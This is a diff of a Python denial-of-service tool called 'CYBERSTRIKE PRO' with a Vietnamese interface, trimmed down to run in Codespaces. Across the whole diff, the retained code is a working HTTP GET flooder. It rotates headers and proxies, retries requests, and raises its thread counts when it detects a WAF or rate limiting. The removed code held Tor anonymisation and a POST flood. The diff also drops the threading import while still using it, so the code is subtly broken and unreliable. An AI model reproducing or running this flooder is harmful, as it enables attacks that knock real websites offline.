@@ -4,8 +4,6 @@
 # ©️ Quang Bảo 2025 - All Rights Reserved
 
 import requests
-import threading
-import multiprocessing
 import time
 import urllib.parse
 import os
@@ -14,11 +12,9 @@ import hashlib
 import json
 from datetime import datetime
 import whois
-import dns.resolver
 from bs4 import BeautifulSoup
 import asyncio
 import aiohttp
-from concurrent.futures import ThreadPoolExecutor
 import psutil
 from rich.console import Console
 from rich.table import Table
@@ -27,12 +23,20 @@ from rich.prompt import Prompt, Confirm
 from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn
 from rich.theme import Theme
 from rich.text import Text
-from torpy.http.requests import tor_requests_session
-from Wappalyzer import Wappalyzer, WebPage
-import ssl
-import certifi
-import warnings
-warnings.filterwarnings("ignore", category=DeprecationWarning)
+
+# ASCII Art đẹp mắt
+ASCII_ART = """
+[bold magenta]
+   _____       _       _     _            
+  / ____|     (_)     | |   | |           
+ | |  __ _   _ _ _ __ | |__ | |__   ___ _ __ 
+ | | |_ | | | | | '_ \\| '_ \\| '_ \\ / _ \\ '__|
+ | |__| | |_| | | | | | | | | |_) |  __/ |   
+  \\_____|\\__,_|_|_| |_|_| |_|_.__/ \\___|_|   
+[/]
+[bold cyan]   CYBERSTRIKE PRO © Quang Bảo 2025[/]
+[bold green]   Nhiệm vụ: Bảo vệ và kiểm tra an ninh mạng[/]
+"""
 
 # Khởi tạo console với theme màu
 custom_theme = Theme({
@@ -93,7 +97,7 @@ def check_file_integrity():
 
 # Xóa màn hình
 def clear_screen():
-    os.system('cls' if os.name == 'nt' else 'clear')
+    os.system('clear')  # Codespaces dùng 'clear' thay vì 'cls'
 
 # Hiệu ứng tải
 def loading_animation(message, duration):
@@ -134,23 +138,14 @@ def generate_random_headers():
         'Sec-Fetch-Dest': random.choice(['document', 'empty', 'script']),
     }
 
-# Tải danh sách proxy
-PROXY_LIST = []
-async def fetch_proxies():
-    try:
-        async with aiohttp.ClientSession() as session:
-            async with session.get("https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all") as response:
-                proxies = (await response.text()).splitlines()
-                PROXY_LIST.extend([f"http://{proxy}" for proxy in proxies if proxy])
-                console.print(f"[success]PROXY: Tải {len(PROXY_LIST)} proxy thành công! [success][✓][/]")
-    except Exception as e:
-        console.print(f"[error]PROXY: Không thể tải proxy: [bold red]{str(e)}[/] [error][✗][/]")
+# Danh sách proxy (thủ công cho Codespaces)
+PROXY_LIST = [
+    "http://proxy1.example.com:8080",  # Thay bằng proxy thật nếu có
+    "http://proxy2.example.com:8080",
+]
 
 def get_random_proxy():
-    if not PROXY_LIST:
-        return None
-    proxy = random.choice(PROXY_LIST)
-    return {'http': proxy, 'https': proxy}
+    return random.choice(PROXY_LIST) if PROXY_LIST else None
 
 # Bộ đếm toàn cục
 manager = threading.Lock()
@@ -170,62 +165,28 @@ def validate_url(url):
     except Exception as e:
         raise ValueError(f"URL không hợp lệ: [bold red]{e}[/]")
 
-# Phân tích công nghệ của website
-def analyze_tech(url):
-    try:
-        wappalyzer = Wappalyzer.latest()
-        webpage = WebPage.new_from_url(url, verify=ssl.create_default_context(cafile=certifi.where()))
-        techs = wappalyzer.analyze_with_versions_and_categories(webpage)
-        console.print(f"[info]TECH SCAN: Công nghệ phát hiện: [bold magenta]{techs}[/] [success][✓][/]")
-        return techs
-    except Exception as e:
-        console.print(f"[error]TECH SCAN: Thất bại: [bold red]{str(e)}[/] [error][✗][/]")
-        return {}
-
-# Quét endpoint
-async def discover_endpoints(url):
-    async with aiohttp.ClientSession() as session:
-        try:
-            async with session.get(url, headers=generate_random_headers(), timeout=5) as response:
-                soup = BeautifulSoup(await response.text(), 'html.parser')
-                endpoints = [a['href'] for a in soup.find_all('a', href=True) if a['href'].startswith('/')]
-                endpoints = [urllib.parse.urljoin(url, ep) for ep in endpoints]
-                console.print(f"[success]ENDPOINTS: Tìm thấy {len(endpoints)} endpoint: {endpoints} [success][✓][/]")
-                return endpoints
-        except Exception as e:
-            console.print(f"[error]ENDPOINTS: Không thể quét: [bold red]{str(e)}[/] [error][✗][/]")
-            return []
-
 # Đánh giá mức độ bảo mật mục tiêu
 def assess_target_security(url):
     security_level = "TRUNG BÌNH"
-    recommended_threads = 1000
-    recommended_requests = 1000
+    recommended_threads = 50  # Giảm cho Codespaces
+    recommended_requests = 50
 
     try:
-        response = requests.head(url, headers=generate_random_headers(), timeout=5, verify=ssl.create_default_context(cafile=certifi.where()))
+        response = requests.head(url, headers=generate_random_headers(), timeout=5)
         headers = response.headers
         waf_indicators = ['cloudflare', 'akamai', 'sucuri']
         server = headers.get('Server', '').lower()
         cdn_waf_detected = any(waf in server or waf in headers.get('X-Powered-By', '').lower() for waf in waf_indicators)
         rate_limit = 'X-RateLimit-Limit' in headers or response.status_code in (429, 403)
-        domain = urllib.parse.urlparse(url).hostname
-        whois_info = whois.whois(domain)
-        creation_date = whois_info.get('creation_date')
-        domain_age = (datetime.now() - creation_date).days if creation_date else 0
 
         if cdn_waf_detected or rate_limit:
             security_level = "CAO"
-            recommended_threads = 5000
-            recommended_requests = 2000
-        elif domain_age > 365:
-            security_level = "TRUNG BÌNH"
-            recommended_threads = 2000
-            recommended_requests = 1000
+            recommended_threads = 100
+            recommended_requests = 100
         else:
             security_level = "THẤP"
-            recommended_threads = 500
-            recommended_requests = 500
+            recommended_threads = 25
+            recommended_requests = 25
 
         console.print(f"[info]HỆ THỐNG: Đánh giá bảo mật: [bold magenta]{security_level}[/], Luồng: [bold cyan]{recommended_threads:,}[/], Yêu cầu: [bold cyan]{recommended_requests:,}[/] [success][✓][/]")
     except Exception as e:
@@ -233,12 +194,12 @@ def assess_target_security(url):
 
     return security_level, recommended_threads, recommended_requests
 
-# Điều chỉnh luồng theo khả năng thiết bị
+# Điều chỉnh luồng theo khả năng Codespaces
 def adjust_threads_for_device(num_threads, num_requests):
-    cpu_count = multiprocessing.cpu_count()
+    cpu_count = psutil.cpu_count()
     ram_available = psutil.virtual_memory().available / (1024 * 1024)  # MB
-    max_threads = min(num_threads, cpu_count * 1000, int(ram_available / 10))  # Giới hạn dựa trên CPU và RAM
-    max_requests = min(num_requests, 9999999)
+    max_threads = min(num_threads, cpu_count * 10, int(ram_available / 2))  # Giới hạn cho Codespaces
+    max_requests = min(num_requests, 500)
     console.print(f"[info]HỆ THỐNG: Điều chỉnh: [bold cyan]{max_threads:,}[/] luồng, [bold cyan]{max_requests:,}[/] yêu cầu dựa trên [bold magenta]{cpu_count}[/] CPU và [bold magenta]{ram_available:.0f}[/] MB RAM. [success][✓][/]")
     return max_threads, max_requests
 
@@ -250,83 +211,41 @@ def monitor_resources():
     return cpu_usage, ram_usage
 
 # Tấn công CLOG bất đồng bộ
-async def clog_attack_async(url, requests_per_thread, duration, semaphore, use_tor=False):
-    global success_count, error_count, response_times
-    if use_tor:
-        with tor_requests_session() as session:
-            start_time = time.time()
-            for _ in range(requests_per_thread):
-                if time.time() - start_time >= duration:
-                    break
-                try:
-                    headers = generate_random_headers()
-                    start_request = time.time()
-                    response = session.get(url, headers=headers, timeout=3)
-                    console.print(f"[error]TOR CLOG ATTACK: Mã trạng thái: [bold green]{response.status_code}[/] [success][✓][/] ©2025 Quang Bao - DDos Attack")
-                    with manager:
-                        success_count += 1
-                        response_times.append((time.time() - start_request) * 1000)
-                except Exception as e:
-                    with manager:
-                        error_count += 1
-                    console.print(f"[error]TOR CLOG ATTACK: Thất bại: [bold red]{str(e)}[/] [error][✗][/] ©2025 Quang Bao - DDos Attack")
-                time.sleep(random.uniform(0.00005, 0.0001))
-    else:
-        async with aiohttp.ClientSession() as session:
-            start_time = time.time()
-            max_retries = 3
-            for _ in range(requests_per_thread):
-                if time.time() - start_time >= duration:
-                    break
-                async with semaphore:
-                    retries = 0
-                    while retries < max_retries:
-                        try:
-                            headers = generate_random_headers()
-                            proxy = get_random_proxy()
-                            start_request = time.time()
-                            async with session.get(url, headers=headers, proxy=proxy, timeout=3) as response:
-                                console.print(f"[error]CLOG ATTACK: Mã trạng thái: [bold green]{response.status}[/] [success][✓][/] ©2025 Quang Bao - DDos Attack")
-                                with manager:
-                                    success_count += 1
-                                    response_times.append((time.time() - start_request) * 1000)
-                                break
-                        except aiohttp.ClientError as e:
-                            retries += 1
-                            if retries == max_retries:
-                                with manager:
-                                    error_count += 1
-                                console.print(f"[error]CLOG ATTACK: Thất bại sau {max_retries} lần thử: [bold red]{str(e)}[/] [error][✗][/] ©2025 Quang Bao - DDos Attack")
-                            else:
-                                await asyncio.sleep(0.1)
-                        except Exception as e:
-                            with manager:
-                                error_count += 1
-                            console.print(f"[error]CLOG ATTACK: Thất bại: [bold red]{str(e)}[/] [error][✗][/] ©2025 Quang Bao - DDos Attack")
-                            break
-                    await asyncio.sleep(random.uniform(0.00005, 0.0001))
-
-# Tấn công POST
-async def post_attack_async(url, requests_per_thread, duration, semaphore):
+async def clog_attack_async(url, requests_per_thread, duration, semaphore):
     global success_count, error_count, response_times
     async with aiohttp.ClientSession() as session:
         start_time = time.time()
+        max_retries = 3
         for _ in range(requests_per_thread):
             if time.time() - start_time >= duration:
                 break
             async with semaphore:
-                try:
-                    headers = generate_random_headers()
-                    data = {"payload": "x" * random.randint(1000, 10000)}
-                    async with session.post(url, headers=headers, data=data, timeout=3) as response:
-                        console.print(f"[error]POST ATTACK: Mã trạng thái: [bold green]{response.status}[/] [success][✓][/]")
+                retries = 0
+                while retries < max_retries:
+                    try:
+                        headers = generate_random_headers()
+                        proxy = get_random_proxy()
+                        start_request = time.time()
+                        async with session.get(url, headers=headers, proxy=proxy, timeout=3) as response:
+                            console.print(f"[error]CLOG ATTACK: Mã trạng thái: [bold green]{response.status}[/] [success][✓][/] ©2025 Quang Bao - DDos Attack")
+                            with manager:
+                                success_count += 1
+                                response_times.append((time.time() - start_request) * 1000)
+                            break
+                    except aiohttp.ClientError as e:
+                        retries += 1
+                        if retries == max_retries:
+                            with manager:
+                                error_count += 1
+                            console.print(f"[error]CLOG ATTACK: Thất bại sau {max_retries} lần thử: [bold red]{str(e)}[/] [error][✗][/] ©2025 Quang Bao - DDos Attack")
+                        else:
+                            await asyncio.sleep(0.1)
+                    except Exception as e:
                         with manager:
-                            success_count += 1
-                    await asyncio.sleep(random.uniform(0.00005, 0.0001))
-                except Exception as e:
-                    with manager:
-                        error_count += 1
-                    console.print(f"[error]POST ATTACK: Thất bại: [bold red]{str(e)}[/] [error][✗][/]")
+                            error_count += 1
+                        console.print(f"[error]CLOG ATTACK: Thất bại: [bold red]{str(e)}[/] [error][✗][/] ©2025 Quang Bao - DDos Attack")
+                        break
+                await asyncio.sleep(random.uniform(0.0001, 0.0005))
 
 # Quét lỗ hổng web
 async def scan_vulnerabilities(url):
@@ -421,10 +340,11 @@ def display_attack_history():
         console.print("[warning]HỆ THỐNG: Chưa có lịch sử tấn công! [warning][⚠][/]")
         hacker_prompt("HỆ THỐNG: Nhấn Enter để trở về menu: ")
 
-# Hiển thị menu chính
+# Hiển thị menu chính với ASCII
 def display_menu():
     clear_screen()
-    table = Table(title="[info]CYBERSTRIKE PRO © Quang Bao 2025[/]", style="info")
+    console.print(ASCII_ART)
+    table = Table(title="[info]MENU CHÍNH[/]", style="info")
     table.add_column("ID", style="highlight")
     table.add_column("Chức năng", style="success")
     table.add_column("Mô tả")
@@ -435,9 +355,9 @@ def display_menu():
     console.print(table)
 
 # Hàm chạy tấn công CLOG bất đồng bộ
-async def run_clog_attack(url, num_threads, requests_per_thread, duration, use_tor=False):
-    semaphore = asyncio.Semaphore(1000)  # Giới hạn 1000 yêu cầu đồng thời
-    tasks = [clog_attack_async(url, requests_per_thread, duration, semaphore, use_tor) for _ in range(num_threads)]
+async def run_clog_attack(url, num_threads, requests_per_thread, duration):
+    semaphore = asyncio.Semaphore(50)  # Giới hạn 50 yêu cầu đồng thời cho Codespaces
+    tasks = [clog_attack_async(url, requests_per_thread, duration, semaphore) for _ in range(num_threads)]
     await asyncio.gather(*tasks)
 
 # Hàm chính
@@ -445,9 +365,7 @@ def main():
     display_legal_warning()
     check_file_integrity()
     check_auth_key()
-    multiprocessing.set_start_method('spawn')
-    loop = asyncio.get_event_loop()
-    loop.run_until_complete(fetch_proxies())
+    console.print(ASCII_ART)  # Hiển thị ASCII khi bắt đầu
 
     while True:
         try:
@@ -470,42 +388,28 @@ def main():
 
             try:
                 validated_url = validate_url(input_url)
-                host = urllib.parse.urlparse(validated_url).hostname
-                port = urllib.parse.urlparse(validated_url).port or 80
+                console.print(f"[success]HỆ THỐNG: Mục tiêu đã khóa: [bold cyan]{validated_url}[/] [success][✓][/]")
             except ValueError as e:
-                host = input_url
-                port = 80
-                validated_url = f"http://{host}"
-                console.print(f"[warning]HỆ THỐNG: Xử lý mục tiêu như IP: [bold yellow]{host}[/] [warning][⚠][/]")
+                console.print(f"[error]LỖI: {e} [error][✗][/]")
+                continue
 
-            console.print(f"[success]HỆ THỐNG: Mục tiêu đã khóa: [bold cyan]{validated_url}[/] [success][✓][/]")
             loading_animation("Khóa mục tiêu", 2)
 
             if choice == "2":
                 console.print("[info]HỆ THỐNG: Bắt đầu quét lỗ hổng... [success][⚡][/]")
                 loading_animation("Quét lỗ hổng web", 3)
+                loop = asyncio.get_event_loop()
                 vulnerabilities = loop.run_until_complete(scan_vulnerabilities(validated_url))
                 display_vulnerability_report(vulnerabilities)
                 continue
 
-            # Quét endpoint và công nghệ
-            console.print("[info]HỆ THỐNG: Phân tích mục tiêu... [success][⚡][/]")
-            loading_animation("Phân tích công nghệ", 2)
-            techs = analyze_tech(validated_url)
-            endpoints = loop.run_until_complete(discover_endpoints(validated_url))
-            if endpoints:
-                console.print("[info]HỆ THỐNG: Chọn endpoint để tấn công hoặc nhấn Enter để dùng URL chính: [/]")
-                endpoint_choice = hacker_prompt("Nhập endpoint: ", default=validated_url)
-                validated_url = endpoint_choice if endpoint_choice in endpoints else validated_url
-
             # Nhập tham số tấn công
-            num_threads = int(hacker_prompt("Nhập số luồng (1-999999, mặc định: 1000): ", default="1000"))
-            requests_per_thread = int(hacker_prompt("Nhập số yêu cầu mỗi luồng (1-9999999, mặc định: 1000): ", default="1000"))
-            duration = int(hacker_prompt("Nhập thời gian tấn công (giây, mặc định: 60): ", default="60"))
-            use_tor = Confirm.ask("[info]HỆ THỐNG: Sử dụng Tor để ẩn danh?[/]")
+            num_threads = int(hacker_prompt("Nhập số luồng (1-100, mặc định: 10): ", default="10"))
+            requests_per_thread = int(hacker_prompt("Nhập số yêu cầu mỗi luồng (1-500, mặc định: 50): ", default="50"))
+            duration = int(hacker_prompt("Nhập thời gian tấn công (giây, mặc định: 30): ", default="30"))
 
-            num_threads = min(max(1, num_threads), 999999)
-            requests_per_thread = min(max(1, requests_per_thread), 9999999)
+            num_threads = min(max(1, num_threads), 100)
+            requests_per_thread = min(max(1, requests_per_thread), 500)
             duration = max(1, duration)
 
             num_threads, requests_per_thread = adjust_threads_for_device(num_threads, requests_per_thread)
@@ -534,7 +438,6 @@ def main():
 [bold cyan]Thời gian: [bold green]{duration}[/] giây
 [bold cyan]Chiến lược: [bold magenta]{attack_strategy}[/]
 [bold cyan]Tổng lượt đánh: [bold green]{num_threads * requests_per_thread:,}[/]
-[bold cyan]Ẩn danh: [bold green]{'Tor' if use_tor else 'Proxy'}[/]
 [bold cyan]Bản quyền: [bold yellow]©2025 Quang Bao - DDos Attack[/]
                 """,
                 title="[info]THÔNG TIN TẤN CÔNG[/]",
@@ -555,12 +458,11 @@ def main():
             response_times = []
             start_time = time.time()
 
-            # Giám sát tài nguyên trong luồng riêng
             resource_monitor = threading.Thread(target=monitor_resources)
             resource_monitor.start()
 
-            # Chạy tấn công
-            loop.run_until_complete(run_clog_attack(validated_url, num_threads, requests_per_thread, duration, use_tor))
+            loop = asyncio.get_event_loop()
+            loop.run_until_complete(run_clog_attack(validated_url, num_threads, requests_per_thread, duration))
 
             resource_monitor.join()
             total_time = time.time() - start_time
